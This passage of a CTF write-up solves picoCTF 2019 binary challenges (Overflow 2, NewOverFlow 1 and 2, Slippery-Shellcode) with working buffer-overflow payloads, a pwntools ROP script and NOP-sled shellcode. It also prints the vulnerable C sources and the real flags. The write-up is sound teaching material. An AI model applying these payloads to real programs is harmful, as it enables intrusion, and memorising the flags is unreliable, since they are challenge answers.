aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()
</code></pre><p>Let's find the offset for those hex values.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ cyclic -l 0x62616177
188
</code></pre><p>So remember the stack grows from the EBP, so our first and second arguments are between <code>#1-#4</code>. However, the code seems to be looking at <code>ebp+8</code> so let's send <code>4 A's</code> before our arguments.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print &quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;A&quot;*4+&quot;\xef\xbe\xad\xde&quot;+&quot;\x0d\xd0\xde\xc0&quot;' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:/problems/overflow-2$ python -c &quot;from pwn import *; print('A'*188 + p32(0x080485e6) + 'A'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D))&quot; | ./vuln
Please enter your string: 
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
</code></pre><h2><a class=header href=#alternative-without-gdb id=alternative-without-gdb>Alternative without GDB</a></h2><pre><code class=language-bash>$ cyclic 200 | ./vuln
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

$ dmesg | grep vuln
[123123] vuln[3738]: segfault at 62616177 ip 0000000062616177 sp 00000000ffde7fe0 error 14 in libc-2.27.so[f7d1b000+19000]

$ cyclic -l 0x62616177
188
</code></pre><h1><a class=header href=#picoctf19-newoverflow-1 id=picoctf19-newoverflow-1>PicoCTF19 NewOverFlow 1</a></h1><h2><a class=header href=#challenge-4 id=challenge-4>Challenge</a></h2><p>Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this <a href=https://2019shell1.picoctf.com/static/37a322b44b57810c3d9334d734bd394b/vuln>program</a>. You can find it in /problems/newoverflow-1 on the shell server. <a href=https://2019shell1.picoctf.com/static/37a322b44b57810c3d9334d734bd394b/vuln.c>Source</a>.<h2><a class=header href=#hints-4 id=hints-4>Hints</a></h2><p>Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes<h2><a class=header href=#solution-4 id=solution-4>Solution</a></h2><p>Let's take a look at the directory and copy the executable over to my home directory so I can debug it with GDB without any restrictions.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/newoverflow-1$ ls -al
total 96
drwxr-xr-x   2 root       root             4096 Sep 28 21:47 .
drwxr-x--x 684 root       root            69632 Oct 10 18:02 ..
-r--r-----   1 hacksports newoverflow-1_5    50 Sep 28 21:47 flag.txt
-rwxr-sr-x   1 hacksports newoverflow-1_5  8728 Sep 28 21:47 vuln
-rw-rw-r--   1 hacksports hacksports        628 Sep 28 21:47 vuln.c
samson@pico-2019-shell1:/problems/newoverflow-1$ cat vuln.c 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts(&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;);
  vuln();
  return 0;
}

samson@pico-2019-shell1:/problems/newoverflow-1$ cp vuln ~ &amp;&amp; pushd . &amp;&amp; cd ~
samson@pico-2019-shell1:~$ nano flag.txt
samson@pico-2019-shell1:~$ cat flag.txt 
SAMCTF{NOT_THE_ACTUAL_FLAG}
</code></pre><p>It seems like PicoCTF19 Overflow 1, but it doesn't print the last address it will try to access which in the case of the function <code>vuln()</code> will be a return address to <code>main()</code>.<pre><code class=language-bash>Welcome to 64-bit. Give me a string that gets you the flag: 
A
samson@pico-2019-shell1:~$ echo $(python -c &quot;print 'A'*68&quot;) | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Segmentation fault (core dumped)
</code></pre><p>Okay, no help here. So let's crash it with <code>gdb</code>.<pre><code class=language-bash>samson@pico-2019-shell1:~$ gdb ./vuln 
... &lt;redacted&gt;
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) x flag
0x400767 &lt;flag&gt;:        0xe5894855
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4)')
Starting program: /home/samson/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4)')
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007e7 in vuln ()
(gdb) x/g $sp
0x7fffffffe468: 0x4545454544444444
</code></pre><p>So it seems like we need to overwrite the 'C''s and 'D''s with the flag function address <code>0x400767</code>.<pre><code class=language-bash>(gdb)  r &lt; &lt;(python -c &quot;print('A'*72+'\x67\x07\x40'+'\x00'*5)&quot;)
Starting program: /home/samson/vuln &lt; &lt;(python -c &quot;print('A'*72+'\x67\x07\x40'+'\x00'*5)&quot;)
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7ffff7dd0760 &lt;_IO_2_1_stdout_&gt;, format=format@entry=0x7fffffffe418 &quot;SAMCTF{NOT_THE_ACTUAL_FLAG}\n&quot;, args=args@entry=0x7fffffffe338) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
</code></pre><p>Interesting. An error in GDB. What's the program counter register at?<pre><code class=language-bash>(gdb) x/i $pc
=&gt; 0x7ffff7a4266e &lt;buffered_vfprintf+158&gt;:      movaps %xmm0,0x50(%rsp)
</code></pre><p>What's that <code>movaps</code> instruction? I've literally never seen that before?
I'll spare you the search results but basically this error is due to the program causing the kernel to jump to the address <code>0x400767</code> which is not a valid jump address in <code>x64</code>. Otherwise known as a alignment violation. In order to jump properly, I need to jump to an address which is a multiple of 16.<pre><code class=language-bash>(gdb) disas flag
Dump of assembler code for function flag:
   0x0000000000400767 &lt;+0&gt;:     push   %rbp
   0x0000000000400768 &lt;+1&gt;:     mov    %rsp,%rbp
   0x000000000040076b &lt;+4&gt;:     sub    $0x50,%rsp
   0x000000000040076f &lt;+8&gt;:     lea    0x172(%rip),%rsi        # 0x4008e8
   0x0000000000400776 &lt;+15&gt;:    lea    0x16d(%rip),%rdi        # 0x4008ea
   0x000000000040077d &lt;+22&gt;:    callq  0x400660 &lt;fopen@plt&gt;
   0x0000000000400782 &lt;+27&gt;:    mov    %rax,-0x8(%rbp)
   0x0000000000400786 &lt;+31&gt;:    cmpq   $0x0,-0x8(%rbp)
   0x000000000040078b &lt;+36&gt;:    jne    0x4007a3 &lt;flag+60&gt;
   0x000000000040078d &lt;+38&gt;:    lea    0x164(%rip),%rdi        # 0x4008f8
   0x0000000000400794 &lt;+45&gt;:    callq  0x4005f0 &lt;puts@plt&gt;
   0x0000000000400799 &lt;+50&gt;:    mov    $0x0,%edi
   0x000000000040079e &lt;+55&gt;:    callq  0x400670 &lt;exit@plt&gt;
   0x00000000004007a3 &lt;+60&gt;:    mov    -0x8(%rbp),%rdx
   0x00000000004007a7 &lt;+64&gt;:    lea    -0x50(%rbp),%rax
   0x00000000004007ab &lt;+68&gt;:    mov    $0x40,%esi
   0x00000000004007b0 &lt;+73&gt;:    mov    %rax,%rdi
   0x00000000004007b3 &lt;+76&gt;:    callq  0x400620 &lt;fgets@plt&gt;
   0x00000000004007b8 &lt;+81&gt;:    lea    -0x50(%rbp),%rax
   0x00000000004007bc &lt;+85&gt;:    mov    %rax,%rdi
   0x00000000004007bf &lt;+88&gt;:    mov    $0x0,%eax
   0x00000000004007c4 &lt;+93&gt;:    callq  0x400610 &lt;printf@plt&gt;
   0x00000000004007c9 &lt;+98&gt;:    nop
   0x00000000004007ca &lt;+99&gt;:    leaveq 
   0x00000000004007cb &lt;+100&gt;:   retq   
End of assembler dump.
</code></pre><p>Well it looks like the first instruction is most likely just pushing the return address on the stack so the program can return to the <code>main()</code> function after completing flag. The next instruction seems like it is probably related to the <code>flag()</code> function and is a multiple of 16 in hex. So let's try jumping to that address instead.<pre><code class=language-bash>samson@pico-2019-shell1:~$ python -c &quot;print('A'*72+'\x68\x07\x40'+'\x00'*5)&quot; | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
SAMCTF{NOT_THE_ACTUAL_FLAG}
Segmentation fault (core dumped)
samson@pico-2019-shell1:~$ popd &amp;&amp; python -c &quot;print('A'*72+'\x68\x07\x40'+'\x00'*5)&quot; | ./vuln
/problems/newoverflow-1 /problems/newoverflow-1
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}
Segmentation fault (core dumped)
</code></pre><h2><a class=header href=#flag-4 id=flag-4>Flag</a></h2><p><code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}</code><h1><a class=header href=#picoctf19-newoverflow-2 id=picoctf19-newoverflow-2>PicoCTF19 NewOverFlow 2</a></h1><h2><a class=header href=#challenge-5 id=challenge-5>Challenge</a></h2><p>Okay now lets try mainpulating arguments. <a href=https://2019shell1.picoctf.com/static/150f9e68253eae5d2425290e440719f1/vuln>program</a>. You can find it in /problems/newoverflow-2_6 on the shell server. <a href=https://2019shell1.picoctf.com/static/150f9e68253eae5d2425290e440719f1/vuln.c>Source</a>.<h2><a class=header href=#hints-5 id=hints-5>Hints</a></h2><p>Arguments aren't stored on the stack anymore ;)<h2><a class=header href=#solution-5 id=solution-5>Solution</a></h2><p>Let's take a look at the directory and copy the executable over to my home directory so I can debug it with GDB without any restrictions. Let's also make sure there's a <code>flag.txt</code> file with a random flag to tell us when we've solved the problem.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/newoverflow-2_6$ ls -al
total 96
drwxr-xr-x   2 root       root             4096 Sep 28 22:03 .
drwxr-x--x 684 root       root            69632 Oct 10 18:02 ..
-r--r-----   1 hacksports newoverflow-2_6    38 Sep 28 22:03 flag.txt
-rwxr-sr-x   1 hacksports newoverflow-2_6  8880 Sep 28 22:03 vuln
-rw-rw-r--   1 hacksports hacksports       1344 Sep 28 22:03 vuln.c
samson@pico-2019-shell1:/problems/newoverflow-2_6$ cp vuln ~ &amp;&amp; pushd .
/problems/newoverflow-2_6 /problems/newoverflow-2_6
</code></pre><p>The code for this one is a bit longer.<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdbool.h&gt;

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 &amp;&amp; arg_check1 == 0xBAADCAFE &amp;&amp; arg_check2 == 0xCAFEBABE &amp;&amp; arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  if (file == NULL) {
    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
    exit(0);
  }
  fgets(flag, sizeof(flag), file);
  if (win1 &amp;&amp; win2) {
    printf(&quot;%s&quot;, flag);
    return;
  }
  else {
    printf(&quot;Nope, not quite...\n&quot;);
  }
}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (f == NULL) {
    printf(&quot;'flag.txt' missing in the current directory!\n&quot;);
    exit(0);
  }
  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts(&quot;Welcome to 64-bit. Can you match these numbers?&quot;);
  vuln();
  return 0;
}
</code></pre><p>Seems like the usual PicoCTF Overflow problems that we are used to. Pass in some input into a buffer and the program exits.<p>This time however there are three functions, <code>win_fn1()</code>, <code>win_fn2()</code>, and <code>win_fn()</code>.<p>If we were to follow the execution of the program, we need to pass in <code>0xDEADBEEF</code> for <code>win_fn1()</code> and <code>0xBAADCAFE</code> or <code>0xCAFEBABE</code> or <code>0xABADBABE</code> to <code>win_fn2()</code>.<p><code>win_fn()</code> seems to print the flag if the arguments are correct and we'd need to somehow provide the arguments in the input buffer. But I'm not sure why that's necessary if we could just jump to flag.<pre><code>samson@pico-2019-shell1:/problems/newoverflow-2_6$ gdb ./vuln
... &lt;redacted&gt;
(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4+&quot;F&quot;*4+&quot;G&quot;*4+&quot;H&quot;*4+&quot;I&quot;*4)')
Starting program: /problems/newoverflow-2_6/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4+&quot;F&quot;*4+&quot;G&quot;*4+&quot;H&quot;*4+&quot;I&quot;*4)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008cd in vuln ()
(gdb) x/i $pc
=&gt; 0x4008cd &lt;vuln+27&gt;:  retq   
(gdb) disas flag
Dump of assembler code for function flag:
   0x000000000040084d &lt;+0&gt;:     push   %rbp
   0x000000000040084e &lt;+1&gt;:     mov    %rsp,%rbp
   0x0000000000400851 &lt;+4&gt;:     sub    $0x50,%rsp
   0x0000000000400855 &lt;+8&gt;:     lea    0x16c(%rip),%rsi        # 0x4009c8
   0x000000000040085c &lt;+15&gt;:    lea    0x167(%rip),%rdi        # 0x4009ca
   0x0000000000400863 &lt;+22&gt;:    callq  0x400660 &lt;fopen@plt&gt;
   0x0000000000400868 &lt;+27&gt;:    mov    %rax,-0x8(%rbp)
   0x000000000040086c &lt;+31&gt;:    cmpq   $0x0,-0x8(%rbp)
   0x0000000000400871 &lt;+36&gt;:    jne    0x400889 &lt;flag+60&gt;
   0x0000000000400873 &lt;+38&gt;:    lea    0x15e(%rip),%rdi        # 0x4009d8
   0x000000000040087a &lt;+45&gt;:    callq  0x4005f0 &lt;puts@plt&gt;
   0x000000000040087f &lt;+50&gt;:    mov    $0x0,%edi
   0x0000000000400884 &lt;+55&gt;:    callq  0x400670 &lt;exit@plt&gt;
   0x0000000000400889 &lt;+60&gt;:    mov    -0x8(%rbp),%rdx
   0x000000000040088d &lt;+64&gt;:    lea    -0x50(%rbp),%rax
   0x0000000000400891 &lt;+68&gt;:    mov    $0x40,%esi
   0x0000000000400896 &lt;+73&gt;:    mov    %rax,%rdi
   0x0000000000400899 &lt;+76&gt;:    callq  0x400620 &lt;fgets@plt&gt;
   0x000000000040089e &lt;+81&gt;:    lea    -0x50(%rbp),%rax
   0x00000000004008a2 &lt;+85&gt;:    mov    %rax,%rdi
   0x00000000004008a5 &lt;+88&gt;:    mov    $0x0,%eax
   0x00000000004008aa &lt;+93&gt;:    callq  0x400610 &lt;printf@plt&gt;
   0x00000000004008af &lt;+98&gt;:    nop
   0x00000000004008b0 &lt;+99&gt;:    leaveq 
   0x00000000004008b1 &lt;+100&gt;:   retq   
End of assembler dump.
(gdb) info frame
Stack level 0, frame at 0x7fff306a9468:
 rip = 0x4008cd in vuln; saved rip = 0x4545454544444444
 called by frame at 0x7fff306a9478
 Arglist at 0x4343434342424242, args: 
 Locals at 0x4343434342424242, Previous frame's sp is 0x7fff306a9470
 Saved registers:
  rip at 0x7fff306a9468
(gdb) x/10x $sp
0x7fff306a9468: 0x44444444      0x45454545      0x46464646      0x47474747
0x7fff306a9478: 0x48484848      0x49494949      0x306a9500      0x00007fff
0x7fff306a9488: 0x00000000      0x000077b7
(gdb) x/g $sp
0x7fff306a9468: 0x4545454544444444
</code></pre><p>Seems like the return address is stored at the <code>DDDDEEEE</code><p>This is really similar to the NewOverFlow-1 at this point, let's just reuse the code with a few tweaks. But first let's copy it to our home directory in case of any alignment issues.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/newoverflow-2_6$ pushd . &amp;&amp; cp vuln ~ &amp;&amp; cd ~ &amp;&amp; ls -al &amp;&amp; cat flag.txt
/problems/newoverflow-2_6 /problems/newoverflow-2_6
total 1164
drwxrwx--T     5 root   samson   4096 Jan 14 03:22 .
drwxr-xr-x 28449 root   root   737280 Jan 14 03:00 ..
-rw-rw----     1 root   samson  13000 Jan 14 03:21 .bash_history
-rw-r--r--     1 samson samson    220 Apr  4  2018 .bash_logout
-rwxr-xr-x     1 root   samson   3689 Dec 27 01:44 .bashrc
drwx------     2 samson samson   4096 Dec 27 01:45 .cache
drwxr-x---     3 samson samson   4096 Dec 28 21:36 .local
-rwxr-xr-x     1 root   samson    807 Apr  4  2018 .profile
drwxr-x---     3 samson samson   4096 Dec 28 22:22 .pwntools-cache
-rw-------     1 samson samson   1428 Jan  6 06:41 .viminfo
-rw-------     1 samson samson 385024 Jan  9 05:21 core
-rw-r-----     1 samson samson     28 Jan  9 05:20 flag.txt
-rwxr-x---     1 samson samson   8880 Jan 14 03:22 vuln
SAMCTF{NOT_THE_ACTUAL_FLAG}
</code></pre><p>Let's use the address of the flag again.<pre><code class=language-bash>samson@pico-2019-shell1:~$ gdb ./vuln 
... &lt;redacted&gt;
(gdb) r &lt; &lt;(python -c &quot;print('A'*72+'\x4D\x08\x40'+'\x00'*5)&quot;)
Starting program: /home/samson/vuln &lt; &lt;(python -c &quot;print('A'*72+'\x4D\x08\x40'+'\x00'*5)&quot;)
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7ffff7dd0760 &lt;_IO_2_1_stdout_&gt;, format=format@entry=0x7fffffffe418 &quot;SAMCTF{NOT_THE_ACTUAL_FLAG}\n&quot;, args=args@entry=0x7fffffffe338) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
</code></pre><p>Damn, it's an alignment error, but unlike NewOverflow-1, we can't just increment the adddress by one or a few to be divisble by <code>16</code>.<p>What to do...<pre><code>(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4+&quot;F&quot;*4+&quot;G&quot;*4+&quot;H&quot;*4+&quot;I&quot;*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/samson/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4+&quot;F&quot;*4+&quot;G&quot;*4+&quot;H&quot;*4+&quot;I&quot;*4)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008cd in vuln ()
(gdb) x/i $pc
=&gt; 0x4008cd &lt;vuln+27&gt;:  retq   
(gdb) display/i $pc
1: x/i $pc
=&gt; 0x4008cd &lt;vuln+27&gt;:  retq   
(gdb) b *flag+27


(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4+&quot;F&quot;*4+&quot;G&quot;*4+&quot;H&quot;*4+&quot;I&quot;*4)')
Starting program: /home/samson/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64+&quot;B&quot;*4+&quot;C&quot;*4+&quot;D&quot;*4+&quot;E&quot;*4+&quot;F&quot;*4+&quot;G&quot;*4+&quot;H&quot;*4+&quot;I&quot;*4)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00000000004008cd in vuln ()
1: x/i $pc
=&gt; 0x4008cd &lt;vuln+27&gt;:  retq   
(gdb) f
#0  0x00000000004008cd in vuln ()
(gdb) bt
#0  0x00000000004008cd in vuln ()
#1  0x4545454544444444 in ?? ()
#2  0x4747474746464646 in ?? ()
#3  0x4949494948484848 in ?? ()
#4  0x00007fffffffe500 in ?? ()
#5  0x000077b700000000 in ?? ()
#6  0x0000000000400940 in ?? ()
#7  0x00007ffff7a05b97 in __libc_start_main (main=0x4008ce &lt;main&gt;, argc=1, argv=0x7fffffffe578, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe568) at ../csu/libc-start.c:310
#8  0x00000000004006aa in _start ()
</code></pre><pre><code>DISCLAIMER: I got a hint from my fellow teammates at Maple Bacon that this probably means we want to use [ROP Techniques](https://en.wikipedia.org/wiki/Return-oriented_programming)
</code></pre><p>What if we entered a valid address for the <code>DDDDEEEE</code>, and the address of the <code>flag()</code> function for <code>FFFFGGGG</code>. A return would probably be a good choice as it'll just jump to the next address.<pre><code>(gdb) r &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
Starting program: /home/samson/vuln &lt; &lt;(python -c 'print(&quot;A&quot;*64)')
Welcome to 64-bit. Can you match these numbers?

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe460 in ?? ()
1: x/i $pc
=&gt; 0x7fffffffe460:      add    %ah,%ah
(gdb) info frame
Stack level 0, frame at 0x7fffffffe418:
 rip = 0x7fffffffe460; saved rip = 0x400680
 called by frame at 0x7fffffffe420
 Arglist at 0x7fffffffe408, args: 
 Locals at 0x7fffffffe408, Previous frame's sp is 0x7fffffffe418
 Saved registers:
  rip at 0x7fffffffe410
</code></pre><p>The saved <code>rip</code> is at <code>0x400680</code>. This isn't divisible by 16 either. Okay. I give up. Let's use <code>pwntools</code>.<p><code>exploit.py</code><pre><code class=language-python>#!/usr/bin/env python
from __future__ import print_function
from pwn import *

p = process('./vuln')
binary_instructions = ELF('./vuln')
ret = binary_instructions.search(asm('ret')).next()
print(p.recvuntil('Welcome to 64-bit. Can you match these numbers?'))
p.sendline('A'*72+p64(ret)+ p64(binary_instructions.symbols['flag']))
print(p.recvall())
</code></pre><pre><code class=language-bash>samson@pico-2019-shell1:~$ python exploit.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/samson/.pwntools-cache/update to 'never'.
[*] A newer version of pwntools is available on pypi (3.12.2 --&gt; 4.0.0).
    Update with: $ pip install -U pwntools
[+] Starting local process './vuln': pid 2361969
[*] '/home/samson/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Welcome to 64-bit. Can you match these numbers?
[+] Receiving all data: Done (29B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 2361969)

SAMCTF{NOT_THE_ACTUAL_FLAG}
</code></pre><p>It works, let's modify the program to run against the challenge directory.
<code>p = process('./vuln', cwd='/problems/newoverflow-2_6')</code><pre><code class=language-bash>samson@pico-2019-shell1:~$ python exploit.py 
[+] Starting local process './vuln': pid 2362033
[*] '/home/samson/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
Welcome to 64-bit. Can you match these numbers?
[+] Receiving all data: Done (39B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 2362033)

picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}
</code></pre><h2><a class=header href=#flag-5 id=flag-5>Flag</a></h2><p><code>picoCTF{r0p_1t_d0nT_st0p_1t_535c741c}</code><h1><a class=header href=#picoctf19-slippery-shellcode id=picoctf19-slippery-shellcode>PicoCTF19 Slippery-Shellcode</a></h1><h2><a class=header href=#challenge-6 id=challenge-6>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/7bc5b2039cc22a0671fe936eb8633ea1/vuln>program</a> is a little bit more tricky. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/slippery-shellcode on the shell server. <a href=https://2019shell1.picoctf.com/static/7bc5b2039cc22a0671fe936eb8633ea1/vuln.c>Source</a>.<h2><a class=header href=#hints-6 id=hints-6>Hints</a></h2><p>None<h2><a class=header href=#solution-6 id=solution-6>Solution</a></h2><p>Let's print the directory<pre><code class=language-bash>samson@pico-2019-shell1:/problems/slippery-shellcode$ ls -al
total 732
drwxr-xr-x   2 root       root                   4096 Sep 28 21:52 .
drwxr-x--x 684 root       root                  69632 Oct 10 18:02 ..
-r--r-----   1 hacksports slippery-shellcode_5     36 Sep 28 21:52 flag.txt
-rwxr-sr-x   1 hacksports slippery-shellcode_5 662532 Sep 28 21:52 vuln
-rw-rw-r--   1 hacksports hacksports              692 Sep 28 21:52 vuln.c
samson@pico-2019-shell1:/problems/slippery-shellcode$ cat vuln.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  char buf[BUFSIZE];
  puts(&quot;Enter your shellcode:&quot;);
  vuln(buf);
  puts(&quot;Thanks! Executing from a random location now...&quot;);
  int offset = (rand() % 256) + 1;
  ((void (*)())(buf+offset))();
  puts(&quot;Finishing Executing Shellcode. Exiting now...&quot;);
  return 0;
}
</code></pre><p>Look at this line in particular<pre><code>  ((void (*)())buf)();
</code></pre><p>This takes <code>buf+offset</code>, casts it to the void function pointer which returns nothing and then runs that function. So it'll execute whatever is at the address for <code>buf</code>.<p>So the solution for this is to create a <a href=https://en.wikipedia.org/wiki/NOP_slide>NOP Sled</a> to have no executable shellcode at any point in the space between 0 and 255 and execute anything afterwards.
That handles the case where <code>offset==255</code>, then we can run our actual command which is printing the flag.<p>In a nutshell, we are inserting <code>NOP</code> operations until we can certain that our code will be run in full no matter what the random offset will be.<pre><code class=language-bash>samson@pico-2019-shell1:/problems/slippery-shellcode$ (python -c &quot;import pwn; print(pwn.asm(pwn.shellcraft.nop()*256+pwn.shellcraft.cat('flag.txt',1)))&quot;; cat) | ./vuln
Enter your shellcode:
... &lt;redacted&gt;
Thanks! Executing from a random location now...
picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}
Segmentation fault (core dumped)
</code></pre><h2><a class=header href=#flag-6 id=flag-6>Flag</a></h2><p><code>picoCTF{sl1pp3ry_sh311c0d3_ecc37b22}</code><h1><a class=header href=#picoctf19-stringzz id=picoctf19-stringzz>PicoCTF19 Stringzz</a></h1><h2><a class=header href=#challenge-7 id=challenge-7>Challenge</a></h2><p>Use a format string to pwn this <a href=https://2019shell1.picoctf.com/static/f636d94e58ef1e11c1951b986a3c3754/vuln>program</a> and get a flag. Its also found in /problems/stringzz_2 on the shell server. <a href=https://2019shell1.picoctf.com/static/f636d94e58ef1e11c1951b986a3c3754/vuln.c>Source</a>.<h2><a class=header href=#hints-7 id=hints-7>Hints</a></h2><p><a href=http://www.cis.syr.edu/%7Ewedu/Teaching/cis643/LectureNotes_New/Format_String.pdf>http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a><h2><a class=header href=#solution-7 id=solution-7>Solution</a></h2><p>Let's view the directory<pre><code class=language-bash>samson@pico-2019-shell1:/problems/stringzz_2$ ls -al
total 92
drwxr-xr-x   2 root       root        4096 Sep 28 21:45 .
drwxr-x--x 684 root       root       69632 Oct 10 18:02 ..
-r--r-----   1 hacksports stringzz_2    31 Sep 28 21:45 flag.txt
-rwxr-sr-x   1 hacksports stringzz_2  7660 Sep 28 21:45 vuln
-rw-rw-r--   1 hacksports hacksports   789 Sep 28 21:45 vuln.c
samson@pico-2019-shell1:/problems/stringzz_2$ cat vuln.c
#include &lt;stdio.h&gt;
